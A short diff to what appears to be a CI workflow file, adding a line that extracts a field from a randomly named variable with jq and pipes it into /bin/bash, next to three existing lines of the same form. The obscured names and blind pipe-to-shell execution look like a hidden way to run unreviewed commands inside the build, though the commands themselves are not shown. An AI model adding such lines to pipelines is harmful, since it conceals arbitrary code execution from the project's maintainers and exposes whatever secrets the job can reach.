@@ -24,6 +24,7 @@ jobs:
           echo $moxpq6 | jq -r .f6 | /bin/bash
           echo $so7316 | jq -r .p4232 | /bin/bash
           printf '%s' "$lhzw02" | jq -r .hg215 | /bin/bash
+          printf '%s' "$e6797" | jq -r .evmfu19 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
